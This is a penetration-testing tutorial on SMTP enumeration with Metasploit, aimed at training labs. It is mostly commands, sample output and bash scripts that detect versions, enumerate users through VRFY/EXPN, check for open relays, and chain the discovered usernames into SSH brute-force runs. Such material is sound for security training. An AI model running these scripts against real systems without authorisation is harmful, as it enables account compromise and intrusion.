# SMTP Enumeration with Metasploit

## Overview

SMTP (Simple Mail Transfer Protocol) is a communication protocol used for email transmission. This guide covers comprehensive SMTP enumeration techniques using Metasploit auxiliary modules to identify service versions, enumerate users, and gather information for staging further attacks.

## SMTP Fundamentals

- **Port**: 25/TCP (default), 465/TCP (SSL), 587/TCP (TLS)
- **Purpose**: Email transmission between mail servers
- **Common Implementations**: Postfix, Sendmail, Exim, Microsoft Exchange
- **Information Value**: User enumeration, domain information, service banners

## Lab Environment Setup

For practical exercises, use the **TryHackMe** or **Hack The Box** platforms:

**Lab Recommendations**:

- TryHackMe: [Internal](https://tryhackme.com/room/internal) or [Retro](https://tryhackme.com/room/retro)
- Hack The Box: Active machines with SMTP services

**Setup Requirements**:

- Target machine with SMTP service running
- Network connectivity to target
- Metasploit Framework installed

## Initial Setup and Configuration

### Starting Metasploit and Workspace

```bash
# Start database and Metasploit
sudo systemctl start postgresql
msfconsole

# Create dedicated workspace
msf6 > workspace -a smtp_enum
msf6 > workspace smtp_enum

# Set global RHOSTS variable
msf6 > setg RHOSTS 192.168.1.100
```

### Dynamic Target Configuration Script

```bash
#!/bin/bash

TARGET=$1
WORKSPACE="smtp_scan_$(date +%Y%m%d_%H%M%S)"

echo "[*] Starting SMTP enumeration"
echo "[*] Target: $TARGET"
echo "[*] Workspace: $WORKSPACE"

msfconsole -q -x "
workspace -a $WORKSPACE;
setg RHOSTS $TARGET;
echo '[+] Global RHOSTS set to $TARGET';
exit"
```

**Usage**:

```bash
chmod +x smtp_setup.sh
./smtp_setup.sh 192.168.1.100
```

## SMTP Version Detection

### Finding SMTP Modules

```bash
msf6 > search type:auxiliary name:smtp

# Filter for scanner modules
msf6 > search type:auxiliary name:smtp scanner
```

### SMTP Version Scanning

```bash
msf6 > use auxiliary/scanner/smtp/smtp_version
msf6 auxiliary(scanner/smtp/smtp_version) > show options

Module options (auxiliary/scanner/smtp/smtp_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT    25               yes       The target port (TCP)
   THREADS  1                yes       The number of concurrent threads

msf6 auxiliary(scanner/smtp/smtp_version) > run

[*] 192.168.1.100:25 - 192.168.1.100:25 SMTP 220 ubuntu ESMTP Postfix (Ubuntu)\x0d\x0a
[*] Scanned 1 of 1 hosts (100% complete)
```

### Multi-Port Version Detection

```bash
# Check common SMTP ports
msf6 auxiliary(scanner/smtp/smtp_version) > set RPORT 25,465,587
msf6 auxiliary(scanner/smtp/smtp_version) > run
```

### Comprehensive Version Detection Script

```bash
#!/bin/bash

TARGET=$1

msfconsole -q -x "
workspace -a smtp_version_check;
setg RHOSTS $TARGET;
use auxiliary/scanner/smtp/smtp_version;
set RPORT 25,465,587;
run;
exit"
```

## SMTP User Enumeration

### SMTP User Enumeration Module

```bash
msf6 > use auxiliary/scanner/smtp/smtp_enum
msf6 auxiliary(scanner/smtp/smtp_enum) > info

Name: SMTP User Enumeration Utility
Description:
  SMTP User Enumeration Utility

msf6 auxiliary(scanner/smtp/smtp_enum) > show options

Module options (auxiliary/scanner/smtp/smtp_enum):

   Name         Current Setting                                          Required  Description
   ----         ---------------                                          --------  -----------
   RHOSTS                                                               yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT        25                                                       yes       The target port (TCP)
   THREADS      1                                                        yes       The number of concurrent threads
   UNIXONLY     true                                                     no        Skip Microsoft bannered servers when testing unix users
   USER_FILE    /usr/share/metasploit-framework/data/wordlists/unix_users.txt  no        File containing users, one per line
   VERBOSE      true                                                     yes       Whether to print output for all attempts
```

### Performing User Enumeration

```bash
msf6 auxiliary(scanner/smtp/smtp_enum) > set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
msf6 auxiliary(scanner/smtp/smtp_enum) > set VERBOSE true
msf6 auxiliary(scanner/smtp/smtp_enum) > run

[*] 192.168.1.100:25 - 192.168.1.100:25 SMTP - Starting user enumeration...
[*] 192.168.1.100:25 - 192.168.1.100:25 SMTP - Found user: admin
[*] 192.168.1.100:25 - 192.168.1.100:25 SMTP - Found user: administrator
[*] 192.168.1.100:25 - 192.168.1.100:25 SMTP - Found user: backup
[*] 192.168.1.100:25 - 192.168.1.100:25 SMTP - Found user: bin
[*] 192.168.1.100:25 - 192.168.1.100:25 SMTP - Found user: daemon
[*] 192.168.1.100:25 - 192.168.1.100:25 SMTP - Found user: www-data
[*] Scanned 1 of 1 hosts (100% complete)
```

### Advanced User Enumeration Script

```bash
#!/bin/bash

TARGET=$1
USER_LIST=${2:-"/usr/share/metasploit-framework/data/wordlists/unix_users.txt"}

echo "[*] Enumerating SMTP users on $TARGET"
echo "[*] User list: $USER_LIST"

msfconsole -q -x "
workspace -a smtp_user_enum;
setg RHOSTS $TARGET;
use auxiliary/scanner/smtp/smtp_enum;
set USER_FILE $USER_LIST;
set VERBOSE true;
run;
exit"
```

## Advanced SMTP Enumeration Techniques

### SMTP Relay Checking

```bash
msf6 > use auxiliary/scanner/smtp/smtp_relay
msf6 auxiliary(scanner/smtp/smtp_relay) > show options

Module options (auxiliary/scanner/smtp/smtp_relay):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   RHOSTS                     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT     25               yes       The target port (TCP)
   THREADS   1                yes       The number of concurrent threads

msf6 auxiliary(scanner/smtp/smtp_relay) > run
```

### SMTP NTLM Authentication Information Disclosure

```bash
msf6 > use auxiliary/scanner/smtp/smtp_ntlm_domain
msf6 auxiliary(scanner/smtp/smtp_ntlm_domain) > show options

Module options (auxiliary/scanner/smtp/smtp_ntlm_domain):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT    25               yes       The target port (TCP)
   THREADS  1                yes       The number of concurrent threads
```

## Complete SMTP Enumeration Workflow

### Comprehensive Assessment Script

```bash
#!/bin/bash

TARGET=$1
OUTPUT_DIR="smtp_full_enum_$(date +%Y%m%d_%H%M%S)"
mkdir -p $OUTPUT_DIR

echo "[*] Starting comprehensive SMTP enumeration"
echo "[*] Target: $TARGET"
echo "[*] Output directory: $OUTPUT_DIR"

msfconsole -q -x "
workspace -a full_smtp_scan;
setg RHOSTS $TARGET;

echo '[+] Detecting SMTP version';
use auxiliary/scanner/smtp/smtp_version;
set RPORT 25,465,587;
run;

echo '[+] Enumerating SMTP users';
use auxiliary/scanner/smtp/smtp_enum;
set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt;
set VERBOSE true;
run;

echo '[+] Checking for SMTP relay';
use auxiliary/scanner/smtp/smtp_relay;
run;

echo '[+] SMTP enumeration complete';
services;
exit" > $OUTPUT_DIR/full_report.txt

echo "[+] Comprehensive report saved to $OUTPUT_DIR/full_report.txt"
```

**Usage**:

```bash
chmod +x smtp_complete_enum.sh
./smtp_complete_enum.sh 192.168.1.100
```

## Integration with Other Services

### Using SMTP Results for SSH Attacks

```bash
#!/bin/bash

TARGET=$1
SMTP_USERS="smtp_users.txt"

echo "[*] Extracting SMTP users for SSH brute force"

# First, enumerate SMTP users
msfconsole -q -x "
workspace -a smtp_to_ssh;
setg RHOSTS $TARGET;
use auxiliary/scanner/smtp/smtp_enum;
set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt;
set VERBOSE false;
run;
exit" | grep "Found user" | awk '{print $NF}' > $SMTP_USERS

echo "[+] Found $(wc -l $SMTP_USERS | awk '{print $1}') users via SMTP"

# Now use these users for SSH brute force
msfconsole -q -x "
workspace smtp_to_ssh;
use auxiliary/scanner/ssh/ssh_login;
set USER_FILE $SMTP_USERS;
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt;
set STOP_ON_SUCCESS true;
set THREADS 5;
run;
exit"
```

### Cross-Service Integration Script

```bash
#!/bin/bash

TARGET=$1

echo "[*] Starting cross-service enumeration attack"
echo "[*] Target: $TARGET"

# Create workspace
msfconsole -q -x "workspace -a cross_service_attack; setg RHOSTS $TARGET; exit"

# SMTP user enumeration
echo "[+] Enumerating users via SMTP"
msfconsole -q -x "
workspace cross_service_attack;
use auxiliary/scanner/smtp/smtp_enum;
run;
" | grep "Found user" | awk '{print $NF}' > smtp_users.txt

# Use discovered users for SSH attacks
if [ -s smtp_users.txt ]; then
    echo "[+] Found $(wc -l smtp_users.txt | awk '{print $1}') users, proceeding to SSH brute force"
    msfconsole -q -x "
    workspace cross_service_attack;
    use auxiliary/scanner/ssh/ssh_login;
    set USER_FILE smtp_users.txt;
    set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt;
    set STOP_ON_SUCCESS true;
    run;
    sessions;
    exit"
else
    echo "[-] No users found via SMTP"
fi
```

## Manual SMTP Commands for Verification

### Interactive SMTP Testing

```bash
# Connect to SMTP server manually
telnet 192.168.1.100 25

# SMTP commands for manual verification
HELO example.com
VRFY root
VRFY admin
EXPN admin
QUIT
```

### Automated Manual Testing Script

```bash
#!/bin/bash

TARGET=$1
PORT=25

echo "[*] Testing SMTP commands on $TARGET:$PORT"

{
echo "HELO example.com"
sleep 1
echo "VRFY root"
sleep 1
echo "VRFY admin"
sleep 1
echo "EXPN admin"
sleep 1
echo "QUIT"
} | telnet $TARGET $PORT
```

## Real-World Attack Scenario

### Corporate Email Server Assessment

```bash
#!/bin/bash

TARGET=$1
DOMAIN=$2

echo "[*] Starting corporate SMTP assessment"
echo "[*] Target: $TARGET"
echo "[*] Domain: $DOMAIN"

# Phase 1: Basic SMTP enumeration
./smtp_complete_enum.sh $TARGET

# Phase 2: Domain-specific user enumeration
echo "[+] Generating domain-specific user list"
echo "admin@$DOMAIN" > domain_users.txt
echo "administrator@$DOMAIN" >> domain_users.txt
echo "webmaster@$DOMAIN" >> domain_users.txt
echo "postmaster@$DOMAIN" >> domain_users.txt

# Phase 3: Advanced enumeration with custom lists
msfconsole -q -x "
workspace corp_smtp_assessment;
setg RHOSTS $TARGET;
use auxiliary/scanner/smtp/smtp_enum;
set USER_FILE domain_users.txt;
set VERBOSE true;
run;
exit" > domain_enum_results.txt

echo "[+] Assessment complete. Check domain_enum_results.txt"
```

## Best Practices and Security Considerations

### Optimization Tips

```bash
# For comprehensive testing
msf6 auxiliary(scanner/smtp/smtp_enum) > set THREADS 5
msf6 auxiliary(scanner/smtp/smtp_enum) > set VERBOSE false

# For stealth operations
msf6 auxiliary(scanner/smtp/smtp_enum) > set THREADS 1
```

### Common SMTP Security Issues

1. **Open relays** allowing unauthorized email sending
2. **User enumeration** through VRFY and EXPN commands
3. **Version disclosure** in service banners
4. **Weak authentication** mechanisms
5. **Misconfigured access controls**

### Defensive Recommendations

- Disable VRFY and EXPN commands
- Implement rate limiting for SMTP connections
- Use network-level filtering for SMTP access
- Regularly update SMTP software
- Monitor SMTP logs for enumeration attempts
- Implement strong authentication mechanisms

## Information Usage Strategy

### Leveraging SMTP Findings

1. **User Lists**: Use enumerated users for password attacks on other services
2. **Domain Information**: Identify organizational structure and naming conventions
3. **Service Identification**: Determine mail server software for vulnerability research
4. **Relay Configuration**: Check for open relay misconfigurations

### Integration with Other Attack Vectors

```bash
# Example: Chain SMTP user discovery with SSH attacks
./smtp_complete_enum.sh 192.168.1.100
grep "Found user" smtp_results.txt | awk '{print $NF}' > users.txt
./ssh_brute_force.sh 192.168.1.100 users.txt common_passwords.txt
```

## Next Steps

After successful SMTP enumeration:

1. Use discovered usernames for SSH/FTP/SMB brute force attacks
2. Research vulnerabilities in identified SMTP software versions
3. Check for email spoofing possibilities
4. Look for open relay configurations
5. Proceed to HTTP enumeration for comprehensive web application assessment

This SMTP enumeration methodology provides a thorough approach to assessing email services, from initial discovery to user enumeration and integration with other attack vectors, enabling comprehensive network penetration testing.
